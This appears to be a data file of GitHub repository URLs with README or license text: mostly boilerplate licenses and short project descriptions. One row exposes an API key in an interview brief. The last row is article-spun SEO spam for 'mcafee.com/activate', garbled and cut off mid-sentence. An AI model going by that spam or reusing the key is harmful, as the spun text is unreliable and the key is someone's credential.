0,https://github.com/ljinstat/Predicting_Repeated_Buyers_Double11.git,"Merchants sometimes run big promotions (e.g., discounts or cash coupons) on particular dates (e.g., Boxing-day Sales, ""Black Friday"" or ""Double 11 (Nov 11th)‚Äù, in order to attract a large number of new buyers. Unfortunately, many of the attracted buyers are one-time deal hunters, and these promotions may have little long lasting impact on sales. What\'s more, Tmall.com as the creator of Chinese shopping carnival ""Double 11 (Nov 11th)‚Äù is threatening by other e-commercial companies like Jingdong, Suning, which resluts in an increasingly high customer churn rate. As more and more customers involving in this shopping festival and more and more competitions appearing in the market, Tmall.com has to reinforce user loyalty to avoid customer loss. It is well known that in the field of online advertising, customer targeting is extremely challenging, especially for fresh buyers. However, with the long-term user behavior log accumulated by Tmall.com, we may be able to solve this problem using Machine learning models.",,1
0,https://github.com/Hulkofsales/money.git,"MIT License  Copyright (c) [year] [fullname]  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",,1
0,https://github.com/AlgoEngAfzal/Hacker-rank-Matching-Book-Names-and-Descriptions-solution.git,"Our bot has crawled several product pages from the popular Indian e-commerce website, Flipkart.com. All of these pages are specifically about the most popular books being sold on Flipkart (at the time of the crawl).  Each page contained information for exactly one book. We noted down exactly two fields from each of these pages:  1. The name of the book. 2. Description fragment: The first few sentences of the description of the book, as displayed on the page. In some cases,  this string or text field might be terminated prematurely (i.e., not exactly at a word or a sentence boundary). Each of these text blocks is split into two parts of roughly equal length.  Set A contains the names of all the books. Set B contains the description fragments for all the books.  Both the Sets A and B are shuffled up, and the ordering of elements is lost.  Your task is to identify, for each name (a) in Set A, which is the correct corresponding text fragment (b) in Set B, such that, b was the descriptive fragment for the book named a.  Hints: Getting started - Think about using TF-IDF Scores (or a modification of it)  For those getting started with this fascinating domain of text classification, here\'s a wonderful Youtube video of Professor Christopher Manning from Stanford, explaining the TF-IDF , which you could consider using as a starting point.   Input Format  An Integer N on the first line. This is followed by 2N+1 lines.  Text fragments (numbered 1 to N) from Set A, each on a new line (so a total of N lines).  A separator with five asterisk marks ""*"" which indicates the end of Set A and the start of Set B.  Text fragments (numbered 1 to N) from Set B, each on a new line (so a total of N lines).  Output Format  N lines, each containing one integer.  The i-th line should contain an integer j such that the j-th element of Set A and the i-th element of Set B are a pair, i.e., both originally came from the same listing page on Flipkart.  Constraints  1 <= N <= 1000  No text fragment will have more than 10000 characters.  Sample Input  5 How to Be a Domestic Goddess : Baking and the Art of Comfort Cooking (Paperback) Embedded / Real-Time Systems 1st Edition (Paperback) The Merchant of Venice (Paperback) Lose a Kilo a Week (Paperback) Few Things Left Unsaid (Paperback) ***** Today the embedded systems are ubiquitous in occurrence, most significant in function and project an absolutely promising picture of developments in the near future. The Merchant Of Venice is one of Shakespeare\'s best known plays. How To Be A Domestic Goddess: Baking and the Art of Comfort Cooking is a bestselling cookbook by the famous chef Nigella Lawson who aims to introduce the art of baking through text with an emphasis. Lose A Kilo A Week is a detailed diet and weight loss plan, and also shows how to maintain the ideal weight after reaching it. Few Things Left Unsaid is a story of love, romance, and heartbreak. Sample Output  2 3 1 4 5 Explanation  Explaining the Input  The first line indicates that the test case contains the names and descriptions of five popular books listed on Flipkart.  The next five lines are the names of the books (i.e, Set A). After that, we have a separator. That is followed by five lines, each containing description fragments from Set B.  Explaining how we arrived at the Output  The first description, is visibly most closely related to the second book (Embedded / Real-Time Systems 1st Edition (Paperback)).  The second description, is clearly about the Merchant of Venice - which is the third book name in Set-A.  The third description is about Baking - and so, it corresponds to the first of the book names, in Set-A. Similarly, the fourth and fifth descriptions match best with the fourth and fifth book names (i.e, it so happens that they are already in order).  So, the expected output is 2, 3, 1, 4, 5 respectively.  Scoring  The weight for a test case will be proportional to the number of tests (book names) it contains. Two sample tests are available and visible on Compile & Test. A training driven approach or solution is not expected in this challenge, which is why no comprehensive training data has been provided.  Score = M * (C)/N Where M is the Maximum Score for the test case.  C = Number of correct answers in your output.  N = Total number of book names in the test set (which were divided into Set A and Set B respectively).  Note: Submissions will be disqualified if it is evident that the code has been written in such a way that the sample test case answers are hard-coded, or similar approaches, where the answer is not computed, but arrived at by trying to ensure the code matches the sample answers.  Timelimits  Timelimits can be seen here.  Libraries  Libraries available in our Machine Learning/Real Data challenges will be enabled for this contest and are listed here. Please note, that occasionally, a few functions or modules might not work in the constraints of our infrastructure. For instance, some modules try to run multiple threads (and fail). So please try importing the library and functions and cross checking if they work in our online editor in case you plan to develop a solution locally, and then upload to our site.",,1
0,https://github.com/cythecy1/cardgenytest.git,"Summary Create management portal and Web API (referred as GLvNext API below) to serve retail offers for mobile and SPA clients.  Details Offers should be  created locally via admin portal by merchants and  additionally, sourced from various remote APIs all available for consumption via the new GLvNext API for mobile / SPA clients. Offer (served via API) must have fields Title Description Please introduce more fields you consider required for Offer to be useable.  Offer example:  Title: ‚ÄúGet 20% discount for purchases over $100 from selected merchants this Valentine day‚Äù Description: ‚ÄúLorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat‚Äù Considerations: Admin portal authentication/authorisation can be mocked and not required to be fully implemented at this stage or focused at; Initial focus should be on backend and Web API implementation rather than front-end and UI/UX; No user login required to use GLvNext API; Please show usage of HttpClient in the solution; The system should be able to handle high load especially on API side but also handle possible large datasets coming from external sources, consider that this might be a part of large system and integrating with multiple data providers;  Choice of frontend stack is not important (we usually do standard ASP.net Core MVC, jquery or vue.js rather than SPA type of web apps)  Backend stack preferably .NET Core, any version 2.1 to 3.1;  Use Azure stack if familiar; Data persistence / ORM, the choice is yours, preference would be MS SQL and EF Core; Remote API to Consume Remote Offers API details: https://2d976b39.azurewebsites.net/v1/offers https://2d976b39.azurewebsites.net/swagger/index.html Required headers Gl-ApiKey: 8B5A92FC-CA0F-4920-9358-50D2EE74A716 Gl-AppKey: FB Feel free to ask questions about this API during the test. To-Do  Provide the following Approximate estimate in hours/days; High level breakdown of tasks to do; Next, you are required to set up the solution and start implementation. You are not expected to complete this within given 2 hours, so this is not a speed/stress test, simply work in your normal pace, the way you would usually do on a project. Please, submit your work either by zipping the solution up and sharing (dropbox etc.) or via GitHub, GitLab, Azure devops etc. Any clarification and questions are most welcome either via skype or email. Skype: pavel.orlov000 Email: pavel@globalloyalty.com  Bonus Task A bit of refactoring, please spend 15 min to review and submit PR with a few initial changes you recommend here if any. If you think it needs to be refactored further, put your ideas in the description of the PR. https://github.com/jack0fshad0ws/Interview-Quiz/blob/master/GL.FileParser/Class1.cs",,1
0,https://github.com/sboraiah/SmartCart.git,"Designed a course project that works as an e-commerce website. The domain under which the above database management system comes under is Commerce. The objective of the above system is to provide a content management website application, which allows members of the public to purchase specific products via transactions on the website without using any paper work . This system also tries to solve the current problems faced by the e-commerce industry today by using the following workarounds : 1. Segmentation : Dividing customers into first-time users, active customers and in-actives and targeting the first-time users by giving them extra services/features so that they turn into active customers. 2. Targeted Value : Merchant who wants to sell on the website can set up a targeted offer aimed at a specific set of customers.  Tools Used: SublimeText, MYSQL Workbench, LAMP server, Chrome.  Technologies Used: HTML, CSS, PHP, Java Script, MYSQL.",,1
0,https://github.com/CMGF2/TFOA888.git,"Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",,1
0,https://github.com/FOI-Bioinformatics/cansnper1.1.git,"CanSNPer1.1: A toolkit for SNP-typing using NGS data. Copyright (C) 2016 Adrian L√§rkeryd Updates done by David Sundell  VERSION 1.1.0 (Adjusted to python 3, python 2 support is depricated)  This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.  This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.  You should have received a copy of the GNU General Public License along with this program.  If not, see <http://www.gnu.org/licenses/>.",,1
0,https://github.com/hardbaited/esx_joblisting.git,"{""# esx_joblisting  Simple job listing script, that i heavily modified cause i got bored of the old one :)  ## Download & Installation  ### Manually - Download https://github.com/hardbaited/esx_joblisting - Put it in the `[esx]` directory  ## Installation - Import `esx_joblisting.sql` in your database - Add this in your `server.cfg`:  ``` start esx_joblisting ```  # Legal ### License esx_joblisting - job listing script  Copyright (C) 2015-2020 J√©r√©mie N'gadi  This program Is free software: you can redistribute it And/Or modify it under the terms Of the GNU General Public License As published by the Free Software Foundation, either version 3 Of the License, Or (at your option) any later version.  This program Is distributed In the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty Of MERCHANTABILITY Or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License For more details.  You should have received a copy Of the GNU General Public License along with this program. If Not, see http://www.gnu.org/licenses/.""}",,1
0,https://github.com/Satwikan/DoodleJump.git,"Doodle Jump clone in JavaScript, HTML and CSS   Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  *Translation: Ofcourse you can use this for you project! Just make sure to say where you got this from :)  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",,1
0,https://github.com/syedbrinto/readme-edits.git,"MIT License  Copyright (c) [year] [fullname]  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",,1
0,https://github.com/daGeeZy1/MIT-License-Copyright-c-year-fullname-Permission-is-hereby-granted-free-of-charge-to-any-p.git,"MIT License  Copyright (c) [year] [fullname]  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",,1
0,https://github.com/vonj/scraping.git,"Real life example of news site scraper. Download articles matching key\n    words, generate full content reports in PDF, Excel and SPSS.\n\n    SPSS generation might only work on Mac or Windows, pushed here to\n    github ‚Äúas is‚Äù. This whole program is just a hack, take it for what it\n    is, something hastily thrown together to. Enough of excuses - I present\n    you the license:\n\n    The MIT License (MIT)\n\n    Copyright (c) 2015 vonj\n\n    Permission is hereby granted, free of charge, to any person obtaining a\n    copy\n    of this software and associated documentation files (the ""Software""),\n    to deal\n    in the Software without restriction, including without limitation the\n    rights\n    to use, copy, modify, merge, publish, distribute, sublicense, and/or\n    sell\n    copies of the Software, and to permit persons to whom the Software is\n    furnished to do so, subject to the following conditions:\n\n    The above copyright notice and this permission notice shall be included\n    in\n    all copies or substantial portions of the Software.\n\n    THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS\n    OR\n    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL\n    THE\n    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n    FROM,\n    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS\n    IN\n    THE SOFTWARE.","python,scraping,news-site-scraper,spss-generation,spss,hack,pdf-report,statistics",1
0,https://github.com/Agfress/CSGOKing.git,"This is free and unencumbered software released into the public domain.  Anyone is free to copy, modify, publish, use, compile, sell, or distribute this software, either in source code form or as a compiled binary, for any purpose, commercial or non-commercial, and by any means.  In jurisdictions that recognize copyright laws, the author or authors of this software dedicate any and all copyright interest in the software to the public domain. We make this dedication for the benefit of the public at large and to the detriment of our heirs and successors. We intend this dedication to be an overt act of relinquishment in perpetuity of all present and future rights to this software under copyright law.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.  For more information, please refer to <http://unlicense.org/>",,1
0,https://github.com/Pray4me1985/vigilant-barnacle.git,"MIT License  Copyright (c) [year] [fullname]  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",,1
0,https://github.com/Luiskiing/License.git,"7-Zip   ~~~~~   License for use and distribution   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    7-Zip Copyright (C) 1999-2021 Igor Pavlov.    The licenses for files are:      1) 7z.dll:          - The ""GNU LGPL"" as main license for most of the code          - The ""GNU LGPL"" with ""unRAR license restriction"" for some code          - The ""BSD 3-clause License"" for some code     2) All other files: the ""GNU LGPL"".    Redistributions in binary form must reproduce related license information from this file.    Note:     You can use 7-Zip on any computer, including a computer in a commercial     organization. You don\'t need to register or pay for 7-Zip.     GNU LGPL information   --------------------      This library is free software; you can redistribute it and/or     modify it under the terms of the GNU Lesser General Public     License as published by the Free Software Foundation; either     version 2.1 of the License, or (at your option) any later version.      This library is distributed in the hope that it will be useful,     but WITHOUT ANY WARRANTY; without even the implied warranty of     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU     Lesser General Public License for more details.      You can receive a copy of the GNU Lesser General Public License from     http://www.gnu.org/       BSD 3-clause License   --------------------      The ""BSD 3-clause License"" is used for the code in 7z.dll that implements LZFSE data decompression.     That code was derived from the code in the ""LZFSE compression library"" developed by Apple Inc,     that also uses the ""BSD 3-clause License"":      ----     Copyright (c) 2015-2016, Apple Inc. All rights reserved.      Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:      1.  Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.      2.  Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer         in the documentation and/or other materials provided with the distribution.      3.  Neither the name of the copyright holder(s) nor the names of any contributors may be used to endorse or promote products derived         from this software without specific prior written permission.      THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS"" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT     LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE     COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES     (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)     HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)     ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.     ----       unRAR license restriction   -------------------------      The decompression engine for RAR archives was developed using source     code of unRAR program.     All copyrights to original unRAR code are owned by Alexander Roshal.      The license for original unRAR code has the following restriction:        The unRAR sources cannot be used to re-create the RAR compression algorithm,       which is proprietary. Distribution of modified unRAR sources in separate form       or as a part of other software is permitted, provided that it is clearly       stated in the documentation and source comments that the code may       not be used to develop a RAR (WinRAR) compatible archiver.     --   Igor Pavlov",,1
0,https://github.com/VishwasPrasanna/ALDA_Mobile_Money_Transaction_Fraud_Detection.git,"Detecting a fraudulent mobile money transaction is the focus of our work. As mobile transactions continue to increase, online fraud detection continues to become a bigger issue. Although fraud via smartphones is increasing at a faster pace than general PC/laptop based fraud, smartphones have the potential to become as secure a channel as the web through the use of advanced encryption and authentication technologies. By paying close attention to red flags and suspicious activities, you can avoid merchant services fraud. According to the 2018 Global fraud report, it is evident that out of the digital market place consumers 91% of customers use smartphone out of which 88% use for personal banking and it has been noted that 72% cite fraud as a growing concern over the past twelve months and 63% report higher level of fraudulent losses over that same period. One such activity is cited in the rise of Synthetic identities. Synthetic identities come from accounts not held by actual individuals, but by fabricated identities created to perpetuate fraud. These identities are created by combining the credentials and information of a mixed set of individuals to create a completely new ID. Criminals use this kind of technique to commit frauds in the area of healthcare, utility services and taxes. The research in the area of combatting such kind of frauds, motivates us to find a robust system to detect fraudulent transactions. Smartphones have been an easy target for fraudsters as it lacks the security level that other mobile devices have. Fraudsters know that it is generally easier to take over an account by phishing, spear phishing (targeting an individual) or Smishing (phishing via a mobile device), than to open a new account using a real or ‚Äòsynthetic‚Äô identity, which is why the risk of account takeover is one of the most alarming trends in fraud. ",,1
0,https://github.com/nickasyraf/nick.git,"INTEL LICENSE AGREEMENT IMPORTANT - READ BEFORE COPYING OR USING. Do not use or load this library and any associated materials (collectively, the ""Software"") until you have read the following terms and conditions. By loading or using the Software, you agree to the terms of this Agreement. If you do not wish to so agree, do not use the Software. LICENSE: Subject to the restrictions below, Intel Corporation (""Intel"") grants to you the permission to use, copy, distribute and prepare derivative works of this Software for any purpose and without fee, provided, that Intel\'s copyright notice appear in all copies of the Software files.The distribution of derivative works of the Software is also subject to the following limitations: you (i) are solely responsible to your customers for any liability which may arise from the distribution, (ii) do not make any statement that your product is ""certified"", or that its performance is guaranteed, by Intel, and (iii) do not use Intel\'s name or trademarks to market your product without written permission. EXCLUSION OF ALL WARRANTIES. The Software is provided ""AS IS"" without any express or implies warranty of any kind including warranties of merchantability, noninfringement, or fitness for a particular purpose. Intel does not warrant or assume responsibility for the accuracy or completeness of any information contained within the Software.As this Software is given free of charge, in no event shall Intel be liable for any damages whatsoever arising out of the use of or inability to use the Software, even if Intel has been adviced of the possibility of such damages. Intel does not assume any responsibility for any errors which may appear in this Software nor any responsibility to update it.",,1
0,https://github.com/Elathorn/EU4-Province-Mass-Editor.git,"#### WELCOME #### It\'s my first published program so I want to welcome you! I\'m very happy that you decided to use my program. It   should work without any problems.  ### ABOUT ###  EU4 Province Mass Editor is tool which is created for easy editing lot of history files for EU4 game. At the   moment it can change most of starting values.  ### HOW TO USE ### Before running program: Open EU4_provinces_location.txt and change directory for directory you want to modify. Commands usage: [command] [values] NULL [province IDs] 0 Examples: add_core TUR MAM NULL 5 6 0 - will add core for MAM and TUR in provinsed 5 and 6 culture swedish NULL 3 4 0 - will change culture in provines 3 and 4 to swedish add_estate clery NULL 3 0 - will add or change estate to clergy in prowince 3 Commands work like in provinces files so it should be intuitive. WARNING! Using commands unrecorded in file will result in inserting new lines before 5th line. If file is shorter   than 5 lines, it will add new lines at end of file.  ### POSSIBLE ERRORS ### Error: Can\'t open files location: (location here) Check EU4_provinces_location.txt and program permissions to read files.  Error: Can\'t open/save file (file here) Check if program has permissions to read/write files in given location.  ### AUTHOR INFO #### Kamil ""Elas"" Hliwa Contact: elathorn<at>gmail.com Please do not use my email for things like ""how to use this program"" or ""it doesn\'t work"" - use forum topic/PM   instead.  ### COPYRIGHTS ### Copyright (c) 2016 Kamil Hliwa  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated   documentation files (the ""Software""), to deal in the Software without restriction, including without limitation   the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and   to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of   the Software.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO   THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF   CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS   IN THE SOFTWARE.",,1
0,https://github.com/nima0011/ni.git," notices to the program.  It is safest to attach them to the start of each source file to most effectively state the exclusion of warranty; and each file should have at least the ""copyright"" line and a pointer to where the full notice is found.      <one line to give the program\'s name and a brief idea of what it does.>     Copyright (C) <year>  <name of author>      This program is free software: you can redistribute it and/or modify     it under the terms of the GNU General Public License as published by     the Free Software Foundation, either version 3 of the License, or     (at your option) any later version.      This program is distributed in the hope that it will be useful,     but WITHOUT ANY WARRANTY; without even the implied warranty of     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the     GNU General Public License for more details.      You should have received a copy of the GNU General Public License     along with this program.  If not, see <https://www.gnu.org/licenses/>.  Also add information on how to contact you by electronic and paper mail.    If the program does terminal interaction, make it output a short notice like this when it starts in an interactive mode:      <program>  Copyright (C) <year>  <name of author>     This program comes with ABSOLUTELY NO WARRANTY; for details type `show w\'.     This is free software, and you are welcome to redistribute it     under certain conditions; type `show c\' for details.  The hypothetical commands `show w\' and `show c\' should show the appropriate parts of the General Public License.  Of course, your program\'s commands might be different; for a GUI interface, you would use an ""about box"".    You should also get your employer (if you work as a programmer) or school, if any, to sign a ""copyright disclaimer"" for the program, if necessary. For more information on this, and how to apply and follow the GNU GPL, see <https://www.gnu.org/licenses/>.    The GNU General Public License does not permit incorporating your program into proprietary programs.  If your program is a subroutine library, you may consider it more useful to permit linking proprietary applications with the library.  If this is what you want to do, use the GNU Lesser General Public License instead of this License.  But first, please read <https://www.gnu.org/licenses/why-not-lgpl.html>.",,1
0,https://github.com/lilygrace454/mcafee.com-activate.git,"{""The Best Antivirus and Total Protection for Mac! What's the Best Malware Protection?   Malware, Spyware, and Adware Protection   Antivirus programming is basic for each PC. Without it, you hazard losing your own data, your records, and even the money from your financial balance. We've tried in excess of 40 utilities to enable you to pick the best antivirus security for your PCs.    Malware, Spyware, and Adware Protection    Summer is practically here, and we're all anticipating a stunning get-away, be it at the shoreline, in the mountains, or even on a journey. Malware coders get-aways, as well. Theirs is an occupation, similar to some other, from numerous points of view. In any case, that doesn't mean you'll be sheltered from infections, ransomware, bots, and other malware this late spring. The malware office director timetables get-aways, much the same as any office supervisor, to ensure someone's at work, making new assaults on your gadgets and your information. Before you head out, check your antivirus membership to ensure it won't take its very own get-away soon. In case you're not ensured at this point, put introducing an antivirus on your agenda. We've tried and McAfee com activate antivirus instruments so you can pick one and unwind with no stresses.    We call it antivirus, yet in truth it's far-fetched you'll get hit with a real PC infection. Malware nowadays is tied in with profiting, and there's no simple method to take advantage of spreading an infection. Ransomware and information taking Trojans are considerably more typical, as are bots that let the bot-herder lease your PC for loathsome purposes. Current antivirus utilities handle Trojans, rootkits, spyware, adware, ransomware, and that's only the tip of the iceberg. PCMag has explored in excess of 40 distinctive business antivirus utilities, and that is not notwithstanding checking the many free antivirus devices. Out of that broad field we've named fourEditors' Choice items.    mcafee activate product key  antivirus utilities demonstrated powerful enough to procure an astounding four-star rating nearby their progressively conventional partners. VoodooSoft VoodooShield puts together its security with respect to stifling every obscure program while the PC is in a powerless state, for example, when it's associated with the web, and furthermore acts to identify known malware. The Kure resets the PC to a known safe state on each reboot, consequently wiping out any malware. On the off chance that you have malware, one of the ten items in the graph above should deal with the issue.    You may see that one item in the outline earned simply 3.5 stars. The diagram had space for one more, and of the seven 3.5-star items, the labs just focus on F-Secure and G Data. F-Secure has the additional fillip of costing the equivalent for three licenses as most items charge for only one, so it advanced into the diagram. The blurbs at the base of this article incorporate each business antivirus that earned 3.5 stars or better.    www.mcafee.com/activate offer insurance past the antivirus incorporated with Windows 10; the best free antivirus utilities additionally offer more. In any case, Microsoft Windows Defender Security Center is looking somewhat better recently, with some awesome scores from free testing labs. In our grasp on tests, it demonstrated a checked improvement since our past audit, enough to at long last bring it up to three stars.    Tune in to the Labs    We take the outcomes announced by free antivirus testing labs in all respects truly. The basic reality that a specific merchant's item appears in the outcomes is a demonstration of positive support, of sorts. It implies the lab considered the item huge, and the merchant felt the expense of testing was advantageous. Obviously, getting great scores in the tests is additionally significant.    We pursue four labs that normally discharge nitty gritty reports: SE Labs, AV-Test Institute, MRG-Effitas, and AV-Comparatives. We likewise note whether sellers have contracted with ICSA Labs and West Coast labs for affirmation.    We Test Malware, Spyware, and Adware Defenses We additionally subject each item to our very own hands-on trial of malware assurance, to a limited extent to get an inclination for how the item functions. Contingent upon how altogether the item averts malware establishment, it can acquire up to 10 for malware assurance.    Our malware assurance test fundamentally utilizes a similar arrangement of tests for quite a long time. To check an item's treatment of fresh out of the box new malware, we test every item utilizing 100 amazingly new malware-facilitating URLs provided by 